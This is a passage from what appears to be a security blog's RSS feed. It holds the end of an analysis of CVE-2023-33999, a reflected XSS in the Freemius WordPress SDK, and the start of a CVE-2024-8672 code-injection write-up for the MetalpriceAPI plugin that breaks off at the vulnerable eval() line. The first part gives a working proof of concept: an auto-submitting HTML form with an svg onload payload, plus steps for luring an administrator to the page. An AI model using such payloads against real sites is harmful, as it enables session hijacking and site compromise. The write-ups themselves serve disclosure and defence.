data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Init&amp;ensp;Freemius.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;tb_tp_fs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Because &lt;code&gt;tablepress.php&lt;/code&gt; is the first file loaded by WordPress when the plugin runs, the Freemius SDK is also initialized from here.&lt;/p&gt;&#xA;&lt;p&gt;Therefore, the flow &lt;code&gt;tablepress/tablepress.php&lt;/code&gt; → &lt;code&gt;tb_tp_fs()&lt;/code&gt; → &lt;code&gt;fs_dynamic_init()&lt;/code&gt; → &lt;code&gt;dynamic_init()&lt;/code&gt; is always executed whenever WordPress processes a request and the TablePress plugin is loaded. This means that the logic inside &lt;code&gt;dynamic_init()&lt;/code&gt;, including reading data from the request (such as &lt;code&gt;purchased_plan&lt;/code&gt;, &lt;code&gt;purchase_email…&lt;/code&gt;), will always have a chance to be triggered when users access endpoints related to the admin area.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#34; title=&#34;Triggering the vulnerability&#34; data-thumbnail=&#34;/posts/2025-12-05-cve-2023-33999/trigger.png&#34; data-sub-html=&#34;&lt;h2&gt;Trigger&lt;/h2&gt;&lt;p&gt;Triggering the vulnerability&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-05-cve-2023-33999/trigger.png&#39; alt=&#34;Trigger&#34; height=&#34;1056&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Triggering the vulnerability&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;However, in order for the vulnerability to be exploited with unauthenticated privileges, the attacker cannot directly interact with it but must build an indirect scenario, such as luring an administrator to visit a malicious website. In that case, the admin’s browser may automatically send a request to the logged-in WordPress admin page, carrying parameters controlled by the attacker, thereby triggering unintended behavior during the plugin’s processing.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;poc&#34;&gt;&lt;span&gt;PoC&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a malicious website that automatically sends a request to the WordPress admin page:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;http://localhost/wp-admin/index.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;hidden&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;purchase&amp;amp;#95;email&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&amp;amp;lt;svg&amp;amp;#47;onload&amp;amp;#61;alert&amp;amp;#40;&amp;amp;#41;&amp;amp;gt;&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;input&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Submit&amp;ensp;request&amp;#34;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;history&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pushState&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;forms&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;].&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;submit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Send the link of this website to a user with administrator privileges and trick them into visiting it, thereby triggering the request when the malicious page is loaded.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2023-33999 originates from &lt;strong&gt;unsanitized input handling&lt;/strong&gt; in &lt;code&gt;fs_request_get()&lt;/code&gt; of the Freemius SDK, allowing user-controlled data to be directly injected into content displayed in the admin page. Because Freemius is widely embedded in many plugins and themes, the impact of this vulnerability is much greater than that of a single plugin. Version 2.5.10 fixes the issue by &lt;strong&gt;separating data retrieval and sanitization&lt;/strong&gt;, ensuring that all data from requests is sanitized before being used.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never trust data from &lt;code&gt;$_GET&lt;/code&gt;, &lt;code&gt;$_POST&lt;/code&gt;, &lt;code&gt;$_REQUEST&lt;/code&gt; – always &lt;strong&gt;sanitize and escape&lt;/strong&gt; before using or displaying it.&lt;/li&gt;&#xA;&lt;li&gt;A vulnerability in a shared SDK (such as Freemius) creates a &lt;strong&gt;chain reaction&lt;/strong&gt; affecting thousands of products.&lt;/li&gt;&#xA;&lt;li&gt;Always check third-party libraries and &lt;strong&gt;update to patched versions in a timely manner&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Early SDK initialization increases the chance that a vulnerability can be triggered on more requests than expected.&lt;/li&gt;&#xA;&lt;li&gt;Reflected XSS can be exploited indirectly through &lt;strong&gt;social engineering&lt;/strong&gt; and malicious websites.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross Site Scripting&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://github.com/Freemius/wordpress-sdk/commit/e34e4f1eb67d02ec20ee8c7ab65c1ca1efe40c01&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-8672 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-05-cve-2025-48140/</link>
      <pubDate>Fri, 05 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-05-cve-2025-48140/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2025-48140/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The Improper Control of Generation of Code (&amp;ldquo;Code Injection&amp;rdquo;) vulnerability in MetalpriceAPI allows Code Injection to be performed. This issue affects MetalpriceAPI from n/a up to version &lt;strong&gt;1.1.4&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-8672&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-8672&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/metalpriceapi/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress MetalpriceAPI Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – MetalpriceAPI&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.1.4):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$attrs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$attrs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;operation&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(value)&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$price&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;$price&amp;ensp;=&amp;ensp;&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$operation&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 